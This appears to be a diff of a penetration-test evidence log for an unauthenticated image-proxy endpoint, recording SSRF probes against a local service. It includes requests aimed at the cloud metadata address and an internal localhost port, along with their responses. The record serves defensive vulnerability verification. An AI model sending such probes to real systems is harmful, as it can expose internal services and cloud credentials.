@@ -1,14 +1,65 @@
 === VULN-01 Open Proxy / SSRF Tests ===
-API base: http://localhost:5002
-Timestamp: 2026-05-30T13:30:36Z
-Status: SERVICES OFFLINE (HTTP 000) — see STATIC-CODE-REVIEW-EVIDENCE.md
+API base: http://localhost:3000
+NestJS reachable: true
+Timestamp: 2026-05-31T12:52:35Z
 
-When stack is running, expected behavior (confirmed by code review):
-- GET /proxy/image?url=<any-valid-url> succeeds without Authorization header
-- Server performs server-side HTTP request via axios (SSRF/open-proxy risk)
+--- Public image (control) ---
+Target URL: https://www.google.com/favicon.ico
+Request: GET http://localhost:3000/proxy/image?url=https%3A%2F%2Fwww.google.com%2Ffavicon.ico
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: image/x-icon
+Cache-Control: public, max-age=86400
+Date: Sun, 31 May 2026 12:52:36 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Transfer-Encoding: chunked
 
-Reproduction (with docker compose up):
-  curl -i "http://localhost:5002/proxy/image?url=https://example.com/favicon.ico"
-  curl -i "http://localhost:5002/proxy/image?url=http://169.254.169.254/latest/meta-data/"
 
-Source: main-server/src/modules/raw-data/proxy.controller.ts — no AuthGuard
+--- Metadata SSRF probe ---
+Target URL: http://169.254.169.254/latest/meta-data/
+Request: GET http://localhost:3000/proxy/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
+HTTP/1.1 500 Internal Server Error
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: text/html; charset=utf-8
+Content-Length: 11
+ETag: W/"b-wU5h1SJ84axh2mJFjylZxYbwbzc"
+Date: Sun, 31 May 2026 12:52:36 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+
+--- Localhost probe ---
+Target URL: http://127.0.0.1:5007/
+Request: GET http://localhost:3000/proxy/image?url=http%3A%2F%2F127.0.0.1%3A5007%2F
+HTTP/1.1 500 Internal Server Error
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: text/html; charset=utf-8
+Content-Length: 11
+ETag: W/"b-wU5h1SJ84axh2mJFjylZxYbwbzc"
+Date: Sun, 31 May 2026 12:52:36 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+
+--- Non-image HTML ---
+Target URL: https://example.com/
+Request: GET http://localhost:3000/proxy/image?url=https%3A%2F%2Fexample.com%2F
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: text/html; charset=utf-8
+Cache-Control: public, max-age=86400
+Date: Sun, 31 May 2026 12:52:36 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Transfer-Encoding: chunked
+
+
